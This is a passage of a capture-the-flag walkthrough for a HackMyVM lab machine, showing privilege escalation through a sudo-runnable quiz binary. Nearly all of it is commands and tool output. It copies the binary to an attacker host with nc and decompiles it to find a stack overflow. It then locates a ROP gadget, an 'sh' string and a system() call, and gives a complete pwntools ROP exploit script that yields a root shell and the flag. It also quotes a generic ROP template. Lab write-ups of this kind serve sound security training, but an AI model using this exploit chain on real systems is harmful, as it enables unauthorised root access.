    use_pty

User www-data may run the following commands on minimal:
    (root) NOPASSWD: /opt/quiz/shop ←
```

`ls -l /opt/quiz/shop`:
```
-rwxrwxr-x 1 root root 16632 Nov  5  2023 /opt/quiz/shop ←
```

`file /opt/quiz/shop`:
```
/opt/quiz/shop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c12ae144027d5fe72a74c6af34ff0619064a699f, for GNU/Linux 3.2.0, not stripped ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`nc -lnvp 5555 > ./shop`:
```
listening on [any] 5555 ... ←
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`cat /opt/quiz/shop | nc 192.168.56.118 5555 -q 0`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.132] 42868 ←
```

`ls -l ./shop`:
```    
-rw-rw-r-- 1 kali kali 16632 Oct  3 08:23 ./shop
```

`chmod u+x ./shop`

`./shop`:
```
Hey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator for 2 years.
If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash
What is my favorite OS?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ←
Nope!!
zsh: segmentation fault  ./shop ←
```

`cutter ./shop`

`Decompiler (main)`:
```c
// WARNING: [rz-ghidra] Detected overlap for variable var_1ch
// WARNING: [rz-ghidra] Detected overlap for variable var_84h

undefined8 main(int argc, char **argv) {
    int32_t iVar1;
    char **var_38h;
    int var_2ch;
    int64_t var_28h;
    int64_t var_20h;
    char *var_18h;
    char *s;

    var_28h = 0x2e73746c75736572;
    var_20h._0_4_ = 0x747874;
    
    s = "Hey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator for 2 years.";
    var_18h = "If you get all the questions right, you win a teddy bear and if you don’t, you win trash.";

    puts(s);
    puts(var_18h);

    var_20h._4_4_ = 0;

    iVar1 = question_1(); ←
    var_20h._4_4_ += iVar1;

    iVar1 = question_2();
    var_20h._4_4_ += iVar1;

    iVar1 = question_3();
    var_20h._4_4_ += iVar1;

    writeResults((char *)&var_28h, (uint64_t)var_20h._4_4_);

    if (var_20h._4_4_ == 3) {
        print_prize(3);
    }

    if (_foo == 0x55) {
        wait_what();
    }

    return 0;
}
```
`Decompiler (sym.question_1)`:
```c
bool question_1(void)
{
    int32_t iVar1;
    char *s1;
    
    puts("What is my favorite OS?");
    fgets(&s1, 200, _stdin); ←
    iVar1 = strcmp(&s1, "linux\n");
    if (iVar1 != 0) {
        puts("Nope!!");
    } else {
        puts("Correct!!");
    }
    return iVar1 == 0;
}
```

`r2 ./shop`:
```
[0x00401150]> iI
arch     x86
baddr    0x400000
binsz    14641
bintype  elf
bits     64
canary   false ←
class    ELF64 ←
compiler GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
crypto   false ←
endian   little ←
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c ←
linenum  true
lsyms    true
machine  AMD x86-64 architecture ←
nx       true ←
os       linux
pic      false
relocs   true
relro    partial ←
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true ←
```

`pwn checksec ./shop`:
```
[*] '/home/kali/shop'
    Arch:     amd64-64-little ←
    RELRO:    Partial RELRO
    Stack:    No canary found ←
    NX:       NX enabled ←
    PIE:      No PIE (0x400000)
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[ASLR](https://book.hacktricks.xyz/binary-exploitation/common-binary-protections-and-bypasses/aslr)

[**#Checking ASLR Status**]

To **check** the ASLR status on a Linux system, you can read the value from the `**/proc/sys/kernel/randomize_va_space**` file. The value stored in this file determines the type of ASLR being applied:
- **0**: No randomization. Everything is static.
- **1**: Conservative randomization. Shared libraries, stack, mmap(), VDSO page are randomized.
- **2**: Full randomization. In addition to elements randomized by conservative randomization, memory managed through `brk()` is randomized.
You can check the ASLR status with the following command:
```
cat /proc/sys/kernel/randomize_va_space
```

`cat /proc/sys/kernel/randomize_va_space`:
```
2 ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[ROP](https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing)

[**#x64 (64-bit) Calling conventions**]

- Uses the **System V AMD64 ABI** calling convention on Unix-like systems, where the **first six integer or pointer arguments are passed in the registers** `**RDI**`**,** `**RSI**`**,** `**RDX**`**,** `**RCX**`**,** `**R8**`**, and** `**R9**`. Additional arguments are passed on the stack. The return value is placed in `RAX`.
- **Windows x64** calling convention uses `RCX`, `RDX`, `R8`, and `R9` for the first four integer or pointer arguments, with additional arguments passed on the stack. The return value is placed in `RAX`.
- **Registers**: 64-bit registers include `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, and `R8` to `R15`.

[**#Finding Gadgets**]

For our purpose, let's focus on gadgets that will allow us to set the **RDI** register (to pass the **"/bin/sh"** string as an argument to **system()**) and then call the **system()** function. We'll assume we've identified the following gadgets:
- **pop rdi; ret**: Pops the top value of the stack into **RDI** and then returns. Essential for setting our argument for **system()**.
- **ret**: A simple return, useful for stack alignment in some scenarios.
And we know the address of the **system()** function.

[**#ROP Chain**]

Below is an example using **pwntools** to set up and execute a ROP chain aiming to execute **system('/bin/sh')** on **x64**:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
    ret_gadget,        # Alignment gadget, if needed
    pop_rdi_gadget,    # pop rdi; ret
    bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
    system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
In this example:
- We utilize the `**pop rdi; ret**` gadget to set `**RDI**` to the address of `**"/bin/sh"**`.
- We directly jump to `**system()**` after setting `**RDI**`, with **system()**'s address in the chain.
- `**ret_gadget**` is used for alignment if the target environment requires it, which is more common in **x64** to ensure proper stack alignment before calling functions.

[**#Stack Alignment**]

**The x86-64 ABI** ensures that the **stack is 16-byte aligned** when a **call instruction** is executed. **LIBC**, to optimize performance, **uses SSE instructions** (like **movaps**) which require this alignment. If the stack isn't aligned properly (meaning **RSP** isn't a multiple of 16), calls to functions like **system** will fail in a **ROP chain**. To fix this, simply add a **ret gadget** before calling **system** in your ROP chain.

`gdb ./shop`

```
gef➤  r ←
Starting program: /home/kali/shop 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Hey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator for 2 years.
If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash
What is my favorite OS?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ←
Nope!!

Program received signal SIGSEGV, Segmentation fault. ←
0x000000000040147d in question_1 ()
```
```
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00007fffffffdef8  →  0x00007fffffffe26f  →  "/home/kali/shop"
$rcx   : 0x00007ffff7ec34e0  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffdda8  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00000000004052a0  →  "Nope!!\n my favorite OS?\nions right, you win a te[...]"
$rdi   : 0x00007ffff7f9c710  →  0x0000000000000000
$rip   : 0x000000000040147d  →  <question_1+0078> ret 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x00007ffff7f38cb0  →  <__strcmp_sse42+0870> pslldq xmm2, 0x6
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdf08  →  0x00007fffffffe27f  →  "COLORFGBG=15;0"
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2c0  →  0x0000000000000000
$r15   : 0x0000000000403e18  →  0x0000000000401200  →  <__do_global_dtors_aux+0000> endbr64 
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdda8│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"   ← $rsp ←
0x00007fffffffddb0│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"
0x00007fffffffddb8│+0x0010: "AAAAAAAAAAAAAAAAAAAAAA\n"
0x00007fffffffddc0│+0x0018: "AAAAAAAAAAAAAA\n"
0x00007fffffffddc8│+0x0020: "AAAAAA\n"
0x00007fffffffddd0│+0x0028: 0x0000000000402178  →  "If you get all the questions right, you win a tedd[...]"
0x00007fffffffddd8│+0x0030: 0x00000000004020f0  →  "Hey guys, I have prepared this little program to f[...]"
0x00007fffffffdde0│+0x0038: 0x0000000000000001
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401472 <question_1+006d> call   0x4010c0 <puts@plt>
     0x401477 <question_1+0072> mov    eax, 0x0
     0x40147c <question_1+0077> leave  
 →   0x40147d <question_1+0078> ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "shop", stopped 0x40147d in question_1 (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40147d → question_1()
```
```
gef➤  pattern create 200 ←
[+] Generating a pattern of 200 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa ←
[+] Saved as '$_gef0'
```
```
gef➤  r ←
Starting program: /home/kali/shop 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Hey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator for 2 years.
If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash
What is my favorite OS?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa ←
Nope!!

Program received signal SIGSEGV, Segmentation fault. ←
0x000000000040147d in question_1 ()
```
```
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00007fffffffdef8  →  0x00007fffffffe26f  →  "/home/kali/shop"
$rcx   : 0x00007ffff7ec34e0  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffdda8  →  "paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava[...]"
$rbp   : 0x616161616161616f ("oaaaaaaa"?)
$rsi   : 0x00000000004052a0  →  "Nope!!\n my favorite OS?\nions right, you win a te[...]"
$rdi   : 0x00007ffff7f9c710  →  0x0000000000000000
$rip   : 0x000000000040147d  →  <question_1+0078> ret 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x00007ffff7f38cb0  →  <__strcmp_sse42+0870> pslldq xmm2, 0x6
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdf08  →  0x00007fffffffe27f  →  "COLORFGBG=15;0"
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2c0  →  0x0000000000000000
$r15   : 0x0000000000403e18  →  0x0000000000401200  →  <__do_global_dtors_aux+0000> endbr64 
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdda8│+0x0000: "paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava[...]"    ← $rsp ←
0x00007fffffffddb0│+0x0008: "qaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawa[...]"
0x00007fffffffddb8│+0x0010: "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"
0x00007fffffffddc0│+0x0018: "saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaaya[...]"
0x00007fffffffddc8│+0x0020: "taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaa"
0x00007fffffffddd0│+0x0028: "uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaa"
0x00007fffffffddd8│+0x0030: "vaaaaaaawaaaaaaaxaaaaaaayaaaaaa"
0x00007fffffffdde0│+0x0038: "waaaaaaaxaaaaaaayaaaaaa"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401472 <question_1+006d> call   0x4010c0 <puts@plt>
     0x401477 <question_1+0072> mov    eax, 0x0
     0x40147c <question_1+0077> leave  
 →   0x40147d <question_1+0078> ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "shop", stopped 0x40147d in question_1 (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40147d → question_1()
```
```
gef➤  pattern offset $rsp ←
[+] Searching for '7061616161616161'/'6161616161616170' with period=8
[+] Found at offset 120 (little-endian search) likely ←
```

`ropper --search 'pop rdi' -f ./shop`:
```
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./shop
0x00000000004015dd: pop rdi; ret; ←
```

`gdb ./shop`

```
gef➤  grep sh ←
[+] Searching 'sh' in memory
[+] In '/home/kali/shop'(0x402000-0x403000), permission=r--
  0x402070 - 0x402076  →   "shfpjx" 
  0x4021f5 - 0x4021f7  →   "sh" ←
[+] In '/home/kali/shop'(0x403000-0x404000), permission=r--
  0x403070 - 0x403076  →   "shfpjx" 
  0x4031f5 - 0x4031f7  →   "sh" 
[+] In '[heap]'(0x405000-0x426000), permission=rw-
  0x40531d - 0x40532a  →   "sh\n years.\n" 
[+] In '/usr/lib/x86_64-linux-gnu/libc.so.6'(0x7ffff7dc4000-0x7ffff7dea000), permission=r--
  0x7ffff7ddbae8 - 0x7ffff7ddbaea  →   "sh" 
  0x7ffff7ddf0a1 - 0x7ffff7ddf0a6  →   "shell" 
  0x7ffff7ddf3c7 - 0x7ffff7ddf3cd  →   "shared" 
  0x7ffff7ddf4c1 - 0x7ffff7ddf4d4  →   "sh_all_linebuffered" 
  0x7ffff7ddfcaa - 0x7ffff7ddfcb5  →   "sh_unlocked" 

[...]
```

`objdump -D ./shop | grep "system"`:
```
00000000004010f0 <system@plt>:
  4010f4:       f2 ff 25 35 2f 00 00    bnd jmp *0x2f35(%rip)        # 404030 <system@GLIBC_2.2.5>
  40124f:       e8 9c fe ff ff          call   4010f0 <system@plt> ←
```

`r2 ./shop`

```
[0x00401150]> aa ←
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x00401150]> afl ←
0x00401150    1 38           entry0
0x00401190    4 33   -> 31   sym.deregister_tm_clones
0x004011c0    4 49           sym.register_tm_clones
0x00401200    3 33   -> 32   sym.__do_global_dtors_aux
0x00401230    1 6            entry.init0
0x00401750    1 13           sym._fini
0x00401274   10 301          sym.secret_q2
0x0040147e    7 198          sym.question_2
0x00401180    1 5            sym._dl_relocate_static_pie
0x004015d5    1 10           sym.wait_what
0x0040168f    5 193          main
0x004015e2    4 173          sym.writeResults
0x004013a1    4 100          sym.secret_q3
0x00401405    4 121          sym.question_1
0x00401544    4 145          sym.question_3
0x00401236    3 62           sym.print_prize ←
0x004010f0    1 11           sym.imp.system ←
0x00401100    1 11           sym.imp.printf
0x00401000    3 27           sym._init
0x004010c0    1 11           sym.imp.puts
0x004010d0    1 11           sym.imp.fclose
0x004010e0    1 11           sym.imp.strlen
0x00401110    1 11           sym.imp.fgets
0x00401120    1 11           sym.imp.strcmp
0x00401130    1 11           sym.imp.fprintf
0x00401140    1 11           sym.imp.fopen
```
```
[0x00401150]> s sym.print_prize ←
[0x00401236]> pdf ←
            ; CALL XREF from main @ 0x40172f
┌ 62: sym.print_prize (int64_t arg1);
│           ; var int64_t var_14h @ rbp-0x14
│           ; var int64_t var_4h @ rbp-0x4
│           ; arg int64_t arg1 @ rdi
│           0x00401236      f30f1efa       endbr64
│           0x0040123a      55             push rbp
│           0x0040123b      4889e5         mov rbp, rsp
│           0x0040123e      4883ec20       sub rsp, 0x20
│           0x00401242      897dec         mov dword [var_14h], edi    ; arg1
│           0x00401245      488d05bc0d00.  lea rax, str.cat_._prize.txt ; 0x402008 ; "cat ./prize.txt"
│           0x0040124c      4889c7         mov rdi, rax
│           0x0040124f      e89cfeffff     call sym.imp.system         ; int system(const char *string) ←
│           0x00401254      8945fc         mov dword [var_4h], eax
│           0x00401257      837dfcff       cmp dword [var_4h], 0xffffffff
│       ┌─< 0x0040125b      7514           jne 0x401271
│       │   0x0040125d      488d05b40d00.  lea rax, str.Error          ; 0x402018 ; "Error"
│       │   0x00401264      4889c7         mov rdi, rax
│       │   0x00401267      b800000000     mov eax, 0
│       │   0x0040126c      e88ffeffff     call sym.imp.printf         ; int printf(const char *format)
│       └─> 0x00401271      90             nop
│           0x00401272      c9             leave
└           0x00401273      c3             ret
```

`vim ./rop_exploit.py`:
```python
#!/usr/bin/python3

import signal
import sys
from pwn import *

# Addresses definition
offset = 120
pop_rdi_address = p64(0x4015dd)
sh_addr = p64(0x4031f5)
system_addr = p64(0x40124f)

# Payload crafting
payload = b"A" * offset  # Fills with 'A' to reach the offset
payload += pop_rdi_address  # Adds the address of the "pop rdi" gadget
payload += sh_addr  # Adds the address of the "sh" string
payload += system_addr  # Adds the address of the system() function

# SIGINT (Ctrl+C) handler
def def_handler(sig,frame):
    print("[-] Exiting...")
    sys.exit(1)

# Configure SIGINT (Ctrl+C) handling
signal.signal(signal.SIGINT,def_handler)

if __name__ == "__main__":	
    try:
        target = remote("192.168.56.132",6666) # Remote server connection
    except Exception as e:
        log.error(str(e))
    target.sendline(payload) # Exploit payload sending
    target.interactive()
```

`chmod u+x ./rop_exploit.py`

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`nc -lnvp 6666 | sudo /opt/quiz/shop`:
```
Listening on 0.0.0.0 6666 ←
```

🔄 Alternative Step.

`./socat TCP-LISTEN:6666 EXEC:'sudo /opt/quiz/shop'`:

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`./rop_exploit.py`:
```
[+] Opening connection to 192.168.56.132 on port 6666: Done ←
[*] Switching to interactive mode
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

```
Connection received on 192.168.56.118 34494 ←
```

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) grupos=0(root) ←
```

`cd /root`

`ls -alps`:
```
total 40
4 drwx------  5 root root 4096 Nov  5  2023 ./
4 drwxr-xr-x 20 root root 4096 Nov  1  2023 ../
4 -rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
4 drwxr-xr-x  3 root root 4096 Nov  1  2023 .local/
8 -rw-------  1 root root 5527 Nov  5  2023 .mysql_history
4 -rw-r--r--  1 root root  161 Jul  9  2019 .profile
4 drwx------  2 root root 4096 Nov  1  2023 .ssh/
4 -rw-r--r--  1 root root   30 Nov  1  2023 root.txt ←
4 drwx------  3 root root 4096 Nov  1  2023 snap/
```

`cat ./root.txt`:
```
HMV{never_gonna_ROP_you_down} ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
